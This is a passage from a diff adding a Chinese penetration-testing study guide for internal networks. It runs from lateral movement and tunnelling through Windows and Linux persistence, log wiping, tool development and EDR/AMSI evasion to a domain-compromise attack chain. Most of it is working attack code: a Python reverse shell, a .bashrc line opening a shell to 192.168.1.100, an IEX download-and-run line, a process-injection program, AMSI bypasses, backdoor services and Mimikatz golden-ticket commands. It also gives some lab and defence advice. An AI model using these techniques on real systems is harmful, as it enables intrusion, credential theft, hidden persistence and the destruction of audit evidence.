+# 解密需要用户DPAPI密钥
+
+# Firefox密码提取
+# 查找key4.db和logins.json
+
+# Edge密码
+$edgeData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+</code></pre>
+<h3 id="52-横向移动技术"><a class="header" href="#52-横向移动技术">5.2 横向移动技术</a></h3>
+<h4 id="psexec"><a class="header" href="#psexec">PsExec</a></h4>
+<pre><code class="language-bash"># 官方PsExec
+PsExec.exe \\192.168.1.10 -u domain\admin -p password cmd.exe
+
+# Metasploit PsExec
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.10
+set SMBUser admin
+set SMBPass password
+exploit
+
+# Impacket PsExec
+psexec.py domain/admin:password@192.168.1.10
+</code></pre>
+<h4 id="wmi远程执行"><a class="header" href="#wmi远程执行">WMI远程执行</a></h4>
+<pre><code class="language-powershell"># PowerShell WMI
+$cred = Get-Credential
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName 192.168.1.10 -Credential $cred
+
+# WMIC命令
+wmic /node:192.168.1.10 /user:domain\admin /password:password process call create "cmd.exe /c calc.exe"
+
+# Impacket wmiexec
+wmiexec.py domain/admin:password@192.168.1.10
+</code></pre>
+<h4 id="powershell-remoting"><a class="header" href="#powershell-remoting">PowerShell Remoting</a></h4>
+<pre><code class="language-powershell"># 启用PSRemoting
+Enable-PSRemoting -Force
+
+# 远程执行命令
+Invoke-Command -ComputerName 192.168.1.10 -Credential domain\admin -ScriptBlock {whoami}
+
+# 进入交互式会话
+Enter-PSSession -ComputerName 192.168.1.10 -Credential domain\admin
+
+# 批量执行
+Invoke-Command -ComputerName 192.168.1.10,192.168.1.11 -ScriptBlock {Get-Process}
+</code></pre>
+<h4 id="pass-the-hash攻击"><a class="header" href="#pass-the-hash攻击">Pass-the-Hash攻击</a></h4>
+<pre><code class="language-bash"># Mimikatz PTH
+sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe
+
+# Impacket PTH
+psexec.py -hashes :ntlmhash domain/admin@192.168.1.10
+wmiexec.py -hashes :ntlmhash domain/admin@192.168.1.10
+smbexec.py -hashes :ntlmhash domain/admin@192.168.1.10
+</code></pre>
+<h3 id="53-隧道技术"><a class="header" href="#53-隧道技术">5.3 隧道技术</a></h3>
+<h4 id="ssh隧道"><a class="header" href="#ssh隧道">SSH隧道</a></h4>
+<p><strong>本地端口转发</strong>:</p>
+<pre><code class="language-bash"># 访问内网服务
+ssh -L 8080:192.168.1.10:80 user@jump-server
+# 本地访问 http://localhost:8080
+
+# 访问内网数据库
+ssh -L 3306:192.168.1.20:3306 user@jump-server
+mysql -h 127.0.0.1 -P 3306 -u root -p
+</code></pre>
+<p><strong>远程端口转发</strong>:</p>
+<pre><code class="language-bash"># 将内网服务暴露到公网
+ssh -R 8080:localhost:80 user@public-server
+# 公网访问 http://public-server:8080
+
+# 反向Shell
+ssh -R 4444:localhost:22 user@attacker-server
+</code></pre>
+<p><strong>动态端口转发（SOCKS代理）</strong>:</p>
+<pre><code class="language-bash"># 创建SOCKS代理
+ssh -D 1080 user@jump-server
+
+# 配合proxychains使用
+proxychains nmap -sT 192.168.1.0/24
+proxychains firefox
+</code></pre>
+<h4 id="httphttps隧道"><a class="header" href="#httphttps隧道">HTTP/HTTPS隧道</a></h4>
+<p><strong>reGeorg</strong>:</p>
+<pre><code class="language-bash"># 1. 上传tunnel脚本（tunnel.aspx/jsp/php）
+# 2. 启动代理
+python reGeorgSocksProxy.py -u http://target.com/tunnel.aspx -p 1080
+
+# 3. 使用代理
+proxychains curl http://192.168.1.10
+</code></pre>
+<p><strong>Neo-reGeorg（加密版）</strong>:</p>
+<pre><code class="language-bash"># 生成加密隧道
+python neoreg.py generate -k password
+
+# 启动客户端
+python neoreg.py -k password -u http://target.com/tunnel.php
+</code></pre>
+<h4 id="dns隧道"><a class="header" href="#dns隧道">DNS隧道</a></h4>
+<p><strong>dnscat2</strong>:</p>
+<pre><code class="language-bash"># 服务端
+dnscat2-server domain.com
+
+# 客户端（Windows）
+dnscat2.exe domain.com
+
+# 客户端（Linux）
+./dnscat domain.com
+</code></pre>
+<p><strong>iodine</strong>:</p>
+<pre><code class="language-bash"># 服务端
+iodined -f -P password 10.0.0.1 tunnel.domain.com
+
+# 客户端
+iodine -f -P password tunnel.domain.com
+</code></pre>
+<h4 id="端口转发工具"><a class="header" href="#端口转发工具">端口转发工具</a></h4>
+<p><strong>Chisel</strong>:</p>
+<pre><code class="language-bash"># 服务端
+chisel server -p 8000 --reverse
+
+# 客户端（正向代理）
+chisel client server-ip:8000 8080:192.168.1.10:80
+
+# 客户端（反向代理）
+chisel client server-ip:8000 R:socks
+</code></pre>
+<p><strong>Frp</strong>:</p>
+<pre><code class="language-ini"># frps.ini（服务端）
+[common]
+bind_port = 7000
+
+# frpc.ini（客户端）
+[common]
+server_addr = server-ip
+server_port = 7000
+
+[ssh]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 22
+remote_port = 6000
+</code></pre>
+<hr />
+<h2 id="6-持久化机制"><a class="header" href="#6-持久化机制">6. 持久化机制</a></h2>
+<h3 id="61-windows持久化"><a class="header" href="#61-windows持久化">6.1 Windows持久化</a></h3>
+<h4 id="注册表启动项"><a class="header" href="#注册表启动项">注册表启动项</a></h4>
+<pre><code class="language-powershell"># Run键
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
+
+# RunOnce键
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
+
+# Winlogon
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
+</code></pre>
+<h4 id="计划任务"><a class="header" href="#计划任务">计划任务</a></h4>
+<pre><code class="language-powershell"># 创建每日任务
+schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc daily /st 09:00
+
+# 创建登录触发任务
+schtasks /create /tn "SystemCheck" /tr "powershell.exe -enc &lt;base64&gt;" /sc onlogon /ru System
+
+# 隐蔽任务（XML导入）
+schtasks /create /tn "GoogleUpdate" /xml task.xml
+</code></pre>
+<h4 id="服务安装"><a class="header" href="#服务安装">服务安装</a></h4>
+<pre><code class="language-powershell"># 创建服务
+sc create "WindowsUpdate" binPath= "C:\backdoor.exe" start= auto
+sc description "WindowsUpdate" "Windows Update Service"
+sc start "WindowsUpdate"
+
+# PowerShell创建
+New-Service -Name "BackdoorSvc" -BinaryPathName "C:\backdoor.exe" -StartupType Automatic
+</code></pre>
+<h4 id="wmi事件订阅"><a class="header" href="#wmi事件订阅">WMI事件订阅</a></h4>
+<pre><code class="language-powershell"># 创建WMI持久化
+$FilterArgs = @{
+    name='SystemBootFilter'
+    EventNameSpace='root\CimV2'
+    QueryLanguage='WQL'
+    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs
+
+$ConsumerArgs = @{
+    name='SystemBootConsumer'
+    CommandLineTemplate='powershell.exe -enc &lt;base64&gt;'
+}
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
+
+$FilterToConsumerArgs = @{
+    Filter = $Filter
+    Consumer = $Consumer
+}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs
+</code></pre>
+<h4 id="dll劫持"><a class="header" href="#dll劫持">DLL劫持</a></h4>
+<pre><code class="language-powershell"># 查找可劫持的DLL
+# 使用Process Monitor监控程序加载的DLL
+
+# 常见劫持点
+# 应用程序目录
+# C:\Windows\System32
+# PATH环境变量目录
+
+# 创建恶意DLL
+# DLL必须导出原DLL的所有函数
+# 在DllMain中执行恶意代码
+</code></pre>
+<h3 id="62-linux持久化"><a class="header" href="#62-linux持久化">6.2 Linux持久化</a></h3>
+<h4 id="crontab"><a class="header" href="#crontab">Crontab</a></h4>
+<pre><code class="language-bash"># 用户crontab
+(crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -
+
+# 系统crontab
+echo "*/5 * * * * root /tmp/backdoor.sh" &gt;&gt; /etc/crontab
+
+# cron.d目录
+echo "*/5 * * * * root /tmp/backdoor.sh" &gt; /etc/cron.d/backdoor
+</code></pre>
+<h4 id="ssh密钥"><a class="header" href="#ssh密钥">SSH密钥</a></h4>
+<pre><code class="language-bash"># 添加公钥
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAA..." &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# 修改sshd配置允许root登录
+echo "PermitRootLogin yes" &gt;&gt; /etc/ssh/sshd_config
+systemctl restart sshd
+</code></pre>
+<h4 id="启动脚本"><a class="header" href="#启动脚本">启动脚本</a></h4>
+<pre><code class="language-bash"># systemd服务
+cat &gt; /etc/systemd/system/backdoor.service &lt;&lt;EOF
+[Unit]
+Description=System Monitoring Service
+
+[Service]
+ExecStart=/tmp/backdoor.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable backdoor.service
+systemctl start backdoor.service
+
+# rc.local（传统方法）
+echo "/tmp/backdoor.sh &amp;" &gt;&gt; /etc/rc.local
+chmod +x /etc/rc.local
+</code></pre>
+<h4 id="bashrc劫持"><a class="header" href="#bashrc劫持">.bashrc劫持</a></h4>
+<pre><code class="language-bash"># 在用户.bashrc中添加
+echo 'bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;' &gt;&gt; ~/.bashrc
+
+# 在/etc/bash.bashrc中添加（影响所有用户）
+echo 'bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;' &gt;&gt; /etc/bash.bashrc
+</code></pre>
+<hr />
+<h2 id="7-痕迹清理"><a class="header" href="#7-痕迹清理">7. 痕迹清理</a></h2>
+<h3 id="71-windows日志清理"><a class="header" href="#71-windows日志清理">7.1 Windows日志清理</a></h3>
+<h4 id="事件日志清理"><a class="header" href="#事件日志清理">事件日志清理</a></h4>
+<pre><code class="language-powershell"># 清除所有事件日志
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# PowerShell清除
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+# 删除特定事件
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Remove-WinEvent
+
+# 使用工具
+# Invoke-Phant0m: 终止EventLog线程
+# Phantom: 无痕清理工具
+</code></pre>
+<h4 id="iis日志清理"><a class="header" href="#iis日志清理">IIS日志清理</a></h4>
+<pre><code class="language-powershell"># IIS日志位置
+# C:\inetpub\logs\LogFiles\
+
+# 删除包含攻击IP的日志行
+$ip = "192.168.1.100"
+Get-ChildItem C:\inetpub\logs\LogFiles -Recurse -Filter *.log | ForEach {
+    (Get-Content $_.FullName) | Where-Object { $_ -notmatch $ip } | Set-Content $_.FullName
+}
+</code></pre>
+<h4 id="数据库日志"><a class="header" href="#数据库日志">数据库日志</a></h4>
+<pre><code class="language-sql">-- MySQL日志清理
+SET GLOBAL general_log = 'OFF';
+TRUNCATE TABLE mysql.general_log;
+
+-- MSSQL日志清理
+EXEC sp_cycle_errorlog;
+DBCC SHRINKFILE (ErrorLog, 1);
+</code></pre>
+<h3 id="72-文件痕迹清理"><a class="header" href="#72-文件痕迹清理">7.2 文件痕迹清理</a></h3>
+<h4 id="临时文件清理"><a class="header" href="#临时文件清理">临时文件清理</a></h4>
+<pre><code class="language-powershell"># 清理临时目录
+Remove-Item $env:TEMP\* -Recurse -Force
+Remove-Item C:\Windows\Temp\* -Recurse -Force
+
+# 清理预读取文件
+Remove-Item C:\Windows\Prefetch\* -Force
+
+# 清理最近文件
+Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
+</code></pre>
+<h4 id="时间戳修改"><a class="header" href="#时间戳修改">时间戳修改</a></h4>
+<pre><code class="language-powershell"># 修改文件时间戳
+$(Get-Item file.exe).CreationTime = "2020-01-01 12:00:00"
+$(Get-Item file.exe).LastWriteTime = "2020-01-01 12:00:00"
+$(Get-Item file.exe).LastAccessTime = "2020-01-01 12:00:00"
+
+# 使用timestomp（Metasploit）
+meterpreter &gt; timestomp file.exe -v
+meterpreter &gt; timestomp file.exe -m "2020-01-01 12:00:00"
+</code></pre>
+<h4 id="安全删除文件"><a class="header" href="#安全删除文件">安全删除文件</a></h4>
+<pre><code class="language-bash"># Windows - SDelete
+sdelete.exe -p 7 file.exe
+
+# Linux - shred
+shred -vfz -n 10 file.txt
+
+# 覆盖式删除
+dd if=/dev/urandom of=file.txt bs=1M count=10
+rm file.txt
+</code></pre>
+<h3 id="73-linux日志清理"><a class="header" href="#73-linux日志清理">7.3 Linux日志清理</a></h3>
+<pre><code class="language-bash"># 清空日志文件
+cat /dev/null &gt; /var/log/auth.log
+cat /dev/null &gt; /var/log/syslog
+cat /dev/null &gt; ~/.bash_history
+
+# 删除特定IP的日志
+sed -i '/192.168.1.100/d' /var/log/auth.log
+
+# 清除history
+history -c
+history -w
+unset HISTFILE
+
+# 禁用history记录
+export HISTSIZE=0
+export HISTFILESIZE=0
+</code></pre>
+<hr />
+<h2 id="8-内网渗透工具开发"><a class="header" href="#8-内网渗透工具开发">8. 内网渗透工具开发</a></h2>
+<h3 id="81-python脚本开发"><a class="header" href="#81-python脚本开发">8.1 Python脚本开发</a></h3>
+<h4 id="端口扫描器"><a class="header" href="#端口扫描器">端口扫描器</a></h4>
+<pre><code class="language-python">import socket
+import threading
+from queue import Queue
+
+def port_scan(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((host, port))
+        if result == 0:
+            try:
+                service = socket.getservbyport(port)
+            except:
+                service = "Unknown"
+            print(f"[+] {host}:{port} - {service}")
+        sock.close()
+    except:
+        pass
+
+def worker(host, queue):
+    while not queue.empty():
+        port = queue.get()
+        port_scan(host, port)
+        queue.task_done()
+
+def scan(host, ports):
+    queue = Queue()
+    for port in ports:
+        queue.put(port)
+
+    for _ in range(100):  # 100个线程
+        t = threading.Thread(target=worker, args=(host, queue))
+        t.daemon = True
+        t.start()
+
+    queue.join()
+
+# 使用示例
+scan("192.168.1.10", range(1, 65536))
+</code></pre>
+<h4 id="简易反弹shell"><a class="header" href="#简易反弹shell">简易反弹Shell</a></h4>
+<pre><code class="language-python">import socket
+import subprocess
+import os
+
+def reverse_shell(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+
+    while True:
+        command = s.recv(1024).decode()
+        if command.lower() == 'exit':
+            break
+
+        if command[:2] == 'cd':
+            os.chdir(command[3:])
+            s.send(b'Changed directory\n')
+        else:
+            output = subprocess.getoutput(command)
+            s.send(output.encode() + b'\n')
+
+    s.close()
+
+# 使用
+reverse_shell('192.168.1.100', 4444)
+</code></pre>
+<h3 id="82-powershell脚本开发"><a class="header" href="#82-powershell脚本开发">8.2 PowerShell脚本开发</a></h3>
+<h4 id="信息收集脚本"><a class="header" href="#信息收集脚本">信息收集脚本</a></h4>
+<pre><code class="language-powershell">function Get-SystemInfo {
+    $info = @{}
+
+    # 系统信息
+    $info['Hostname'] = $env:COMPUTERNAME
+    $info['Username'] = $env:USERNAME
+    $info['Domain'] = $env:USERDOMAIN
+    $info['OS'] = (Get-WmiObject Win32_OperatingSystem).Caption
+
+    # 网络信息
+    $info['IP'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
+    $info['Gateway'] = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop
+
+    # 杀软检测
+    $av = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
+    $info['AntiVirus'] = $av.displayName
+
+    # 当前权限
+    $info['IsAdmin'] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    return $info
+}
+
+# 导出结果
+Get-SystemInfo | ConvertTo-Json | Out-File info.json
+</code></pre>
+<h4 id="内存执行脚本"><a class="header" href="#内存执行脚本">内存执行脚本</a></h4>
+<pre><code class="language-powershell"># Invoke-Expression从内存执行
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')
+
+# Bypass执行策略
+powershell.exe -ExecutionPolicy Bypass -File script.ps1
+powershell.exe -ep bypass -c "IEX (Get-Content script.ps1 -Raw)"
+
+# 编码执行
+$command = 'Write-Host "Hello"'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -encodedCommand $encodedCommand
+</code></pre>
+<h3 id="83-cc工具开发"><a class="header" href="#83-cc工具开发">8.3 C/C++工具开发</a></h3>
+<h4 id="进程注入"><a class="header" href="#进程注入">进程注入</a></h4>
+<pre><code class="language-cpp">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// Shellcode (calc.exe)
+unsigned char shellcode[] =
+    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";
+
+int main(int argc, char* argv[]) {
+    DWORD pid = atoi(argv[1]);
+
+    // 打开目标进程
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+    // 在目标进程中分配内存
+    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    // 写入shellcode
+    WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL);
+
+    // 创建远程线程
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                                       (LPTHREAD_START_ROUTINE)pRemoteCode,
+                                       NULL, 0, NULL);
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return 0;
+}
+</code></pre>
+<hr />
+<h2 id="9-防御对抗技术"><a class="header" href="#9-防御对抗技术">9. 防御对抗技术</a></h2>
+<h3 id="91-edr绕过"><a class="header" href="#91-edr绕过">9.1 EDR绕过</a></h3>
+<h4 id="进程注入技术"><a class="header" href="#进程注入技术">进程注入技术</a></h4>
+<p><strong>经典注入</strong>:</p>
+<pre><code class="language-cpp">// 1. CreateRemoteThread注入
+// 2. APC注入
+// 3. Process Hollowing
+// 4. Reflective DLL注入
+</code></pre>
+<p><strong>进程迁移（Meterpreter）</strong>:</p>
+<pre><code class="language-bash">meterpreter &gt; ps
+meterpreter &gt; migrate 1234  # 迁移到合法进程
+</code></pre>
+<h4 id="内存加载"><a class="header" href="#内存加载">内存加载</a></h4>
+<p><strong>PowerShell Reflection</strong>:</p>
+<pre><code class="language-powershell"># 从内存加载.NET程序集
+$bytes = [System.IO.File]::ReadAllBytes("C:\assembly.dll")
+[System.Reflection.Assembly]::Load($bytes)
+[Namespace.Class]::Method()
+
+# 加载PE文件到内存
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234
+</code></pre>
+<p><strong>C# Assembly Execute</strong>:</p>
+<pre><code class="language-csharp">byte[] assemblyBytes = File.ReadAllBytes("payload.dll");
+Assembly assembly = Assembly.Load(assemblyBytes);
+MethodInfo method = assembly.EntryPoint;
+method.Invoke(null, null);
+</code></pre>
+<h4 id="api-hook绕过"><a class="header" href="#api-hook绕过">API Hook绕过</a></h4>
+<pre><code class="language-cpp">// 直接系统调用
+// 绕过用户态Hook
+NTSTATUS NtCreateFile(...) {
+    // 直接调用syscall
+    __asm {
+        mov r10, rcx
+        mov eax, 0x55  // NtCreateFile syscall number
+        syscall
+        ret
+    }
+}
+</code></pre>
+<h3 id="92-avedr检测规避"><a class="header" href="#92-avedr检测规避">9.2 AV/EDR检测规避</a></h3>
+<h4 id="混淆技术"><a class="header" href="#混淆技术">混淆技术</a></h4>
+<pre><code class="language-powershell"># 字符串混淆
+$a = 'I'+'EX'
+&amp; $a (New-Object Net.WebClient).DownloadString('http://...')
+
+# Base64编码
+$command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+powershell.exe -enc $command
+
+# XOR加密
+$key = 0x42
+$encrypted = $shellcode | ForEach-Object { $_ -bxor $key }
+</code></pre>
+<h4 id="amsi绕过"><a class="header" href="#amsi绕过">AMSI绕过</a></h4>
+<pre><code class="language-powershell"># AMSI内存Patch
+$a=[Ref].Assembly.GetTypes();
+Foreach($b in $a) {
+    if ($b.Name -like "*iUtils") {
+        $c=$b
+    }
+};
+$d=$c.GetFields('NonPublic,Static');
+Foreach($e in $d) {
+    if ($e.Name -like "*Context") {
+        $f=$e
+    }
+};
+$g=$f.GetValue($null);
+[IntPtr]$ptr=$g;
+[Int32[]]$buf = @(0);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+# 简化版
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</code></pre>
+<hr />
+<h2 id="10-实战攻击链案例"><a class="header" href="#10-实战攻击链案例">10. 实战攻击链案例</a></h2>
+<h3 id="101-完整攻击链示例"><a class="header" href="#101-完整攻击链示例">10.1 完整攻击链示例</a></h3>
+<p><strong>场景</strong>: 从外网Web服务器渗透到内网域控</p>
+<p><strong>阶段1: 外网突破</strong></p>
+<pre><code class="language-bash"># 1. 信息收集
+nmap -sV target.com
+whatweb target.com
+dirsearch -u http://target.com
+
+# 2. 漏洞利用（假设存在文件上传漏洞）
+# 上传Webshell
+
+# 3. 获得初始Shell
+nc -lvnp 4444
+</code></pre>
+<p><strong>阶段2: 内网信息收集</strong></p>
+<pre><code class="language-powershell"># 获取系统信息
+systeminfo
+ipconfig /all
+net user
+net localgroup administrators
+
+# 查看域环境
+net view /domain
+net group "Domain Controllers" /domain
+nltest /dclist:
+
+# 端口扫描内网
+for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="
+</code></pre>
+<p><strong>阶段3: 权限提升</strong></p>
+<pre><code class="language-powershell"># 使用PowerUp检查提权点
+Invoke-AllChecks
+
+# 利用服务权限提权
+sc config vulnerable_service binPath= "cmd.exe /c net localgroup administrators user /add"
+sc stop vulnerable_service
+sc start vulnerable_service
+</code></pre>
+<p><strong>阶段4: 凭证获取</strong></p>
+<pre><code class="language-powershell"># Mimikatz提取密码
+privilege::debug
+sekurlsa::logonpasswords
+
+# 提取到域用户凭证
+# domain\user : Password123!
+</code></pre>
+<p><strong>阶段5: 横向移动</strong></p>
+<pre><code class="language-bash"># 使用获取的凭证横向到其他主机
+psexec.py domain/user:Password123!@192.168.1.20
+
+# 继续收集凭证
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+</code></pre>
+<p><strong>阶段6: 域控制器攻击</strong></p>
+<pre><code class="language-bash"># Kerberoasting攻击
+GetUserSPNs.py -request -dc-ip 192.168.1.10 domain/user:password
+
+# 获取到域管理员权限后
+psexec.py domain/admin:password@192.168.1.10
+</code></pre>
+<p><strong>阶段7: 持久化</strong></p>
+<pre><code class="language-powershell"># 创建域用户
+net user backdoor Password123! /add /domain
+net group "Domain Admins" backdoor /add /domain
+
+# 黄金票据
+mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"
+mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt"
+</code></pre>
+<h3 id="102-红蓝对抗场景"><a class="header" href="#102-红蓝对抗场景">10.2 红蓝对抗场景</a></h3>
+<h4 id="红队攻击策略"><a class="header" href="#红队攻击策略">红队攻击策略</a></h4>
+<p><strong>初始访问</strong>:</p>
+<ul>
+<li>钓鱼邮件 + Office宏</li>
+<li>供应链攻击</li>
+<li>VPN弱密码爆破</li>
+<li>0day漏洞利用</li>
+</ul>
+<p><strong>持久化策略</strong>:</p>
+<ul>
+<li>多重持久化点</li>
+<li>隐蔽通信通道</li>
+<li>备用C2服务器</li>
+<li>云端资源利用</li>
+</ul>
+<p><strong>横向移动路径</strong>:</p>
+<pre><code>Web服务器 -&gt; 跳板机 -&gt; 内网PC -&gt; 服务器 -&gt; 域控
+</code></pre>
+<h4 id="蓝队防御策略"><a class="header" href="#蓝队防御策略">蓝队防御策略</a></h4>
+<p><strong>检测点部署</strong>:</p>
+<ul>
+<li>网络流量分析（IDS/IPS）</li>
+<li>端点检测响应（EDR）</li>
+<li>日志集中分析（SIEM）</li>
+<li>蜜罐系统部署</li>
+</ul>
+<p><strong>响应措施</strong>:</p>
+<pre><code class="language-bash"># 1. 隔离受感染主机
+# 2. 阻断C2通信
+# 3. 收集取证数据
+# 4. 分析攻击手法
+# 5. 修复漏洞
+# 6. 恢复业务
+</code></pre>
+<hr />
+<h2 id="11-学习验证标准"><a class="header" href="#11-学习验证标准">11. 学习验证标准</a></h2>
+<h3 id="-阶段一基础建立1-2个月"><a class="header" href="#-阶段一基础建立1-2个月">✅ 阶段一：基础建立（1-2个月）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+熟悉内网拓扑结构和常见网络架构</li>
+<li><input disabled="" type="checkbox"/>
+掌握Nmap、Masscan等扫描工具</li>
+<li><input disabled="" type="checkbox"/>
+理解Windows和Linux权限模型</li>
+<li><input disabled="" type="checkbox"/>
+能够搭建域环境测试实验室</li>
+<li><input disabled="" type="checkbox"/>
+完成OSCP/HTB 10台靶机</li>
+</ul>
+<h3 id="-阶段二技能提升3-4个月"><a class="header" href="#-阶段二技能提升3-4个月">✅ 阶段二：技能提升（3-4个月）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+掌握5种以上横向移动技术</li>
+<li><input disabled="" type="checkbox"/>
+能够进行Kerberos攻击（Kerberoasting、Golden Ticket）</li>
+<li><input disabled="" type="checkbox"/>
+熟练使用Mimikatz、BloodHound等工具</li>
+<li><input disabled="" type="checkbox"/>
+编写自动化渗透脚本</li>
+<li><input disabled="" type="checkbox"/>
+完成域渗透CTF挑战</li>
+</ul>
+<h3 id="-阶段三实战应用5-6个月"><a class="header" href="#-阶段三实战应用5-6个月">✅ 阶段三：实战应用（5-6个月）</a></h3>
+<ul>
+<li><input disabled="" type="checkbox"/>
+独立完成完整内网渗透项目</li>
+<li><input disabled="" type="checkbox"/>
+绕过EDR/AV防护</li>
+<li><input disabled="" type="checkbox"/>
+开发自定义渗透工具</li>
+<li><input disabled="" type="checkbox"/>
+参与红蓝对抗演练</li>
+<li><input disabled="" type="checkbox"/>
+通过OSCP/OSEP认证</li>
+</ul>
+<hr />
+<h2 id="12-实战环境推荐"><a class="header" href="#12-实战环境推荐">12. 实战环境推荐</a></h2>
+<h3 id="在线靶场"><a class="header" href="#在线靶场">在线靶场</a></h3>
+<ul>
+<li><strong>HackTheBox</strong>: Active Directory靶机</li>
+<li><strong>VulnHub</strong>: 内网渗透系列靶机</li>
+<li><strong>GOAD</strong>: 游戏化AD环境</li>
+<li><strong>PentesterAcademy</strong>: 红队实验室</li>
+</ul>
+<h3 id="本地搭建"><a class="header" href="#本地搭建">本地搭建</a></h3>
+<p><strong>域环境搭建</strong>:</p>
+<pre><code class="language-powershell"># Windows Server 2019 (域控)
+Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
+Install-ADDSForest -DomainName "lab.local"
+
+# Windows 10 (域成员)
+Add-Computer -DomainName "lab.local" -Credential (Get-Credential)
+Restart-Computer
+
+# 创建测试用户
+New-ADUser -Name "testuser" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
+</code></pre>
+<p><strong>靶场推荐配置</strong>:</p>
+<pre><code>1台域控 (Windows Server 2019)
+2台域成员机 (Windows 10)
+1台Web服务器 (Ubuntu + DVWA)
+1台数据库服务器 (Windows + MSSQL)
+1台Kali攻击机
+</code></pre>
+<hr />
+<h2 id="13-扩展学习资源"><a class="header" href="#13-扩展学习资源">13. 扩展学习资源</a></h2>
+<h3 id="-推荐书籍"><a class="header" href="#-推荐书籍">📚 推荐书籍</a></h3>
+<ol>
+<li><strong>《内网安全攻防》</strong> - 系统化内网渗透知识</li>
+<li><strong>《渗透测试实践指南（第3版）》</strong> - 经典必读</li>
+<li><strong>《Active Directory安全指南》</strong> - AD安全深度解析</li>
+<li><strong>《PowerShell攻防实战》</strong> - PowerShell渗透技巧</li>
+</ol>
+<h3 id="-在线课程"><a class="header" href="#-在线课程">🎓 在线课程</a></h3>
+<ul>
+<li>SANS SEC560: Network Penetration Testing</li>
+<li>Offensive Security: PEN-300 (OSEP)</li>
+<li>Pentester Academy: Red Team Lab</li>
+<li>eLearnSecurity: eCPTXv2</li>
+</ul>
+<h3 id="-必备工具集"><a class="header" href="#-必备工具集">🔧 必备工具集</a></h3>
+<p><strong>信息收集</strong>:</p>
+<pre><code class="language-bash">nmap, masscan, crackmapexec, bloodhound,
+sharphound, adrecon, powerView
+</code></pre>
+<p><strong>漏洞利用</strong>:</p>
+<pre><code class="language-bash">metasploit, empire, covenant, sliver,
+impacket, crackmapexec
+</code></pre>
+<p><strong>权限提升</strong>:</p>
+<pre><code class="language-bash">winpeas, linpeas, powerup, powerless,
+beroot, linux-exploit-suggester
+</code></pre>
+<p><strong>凭证获取</strong>:</p>
+<pre><code class="language-bash">mimikatz, lazagne, pypykatz, secretsdump,
+rubeus, kerberoast
+</code></pre>
+<p><strong>横向移动</strong>:</p>
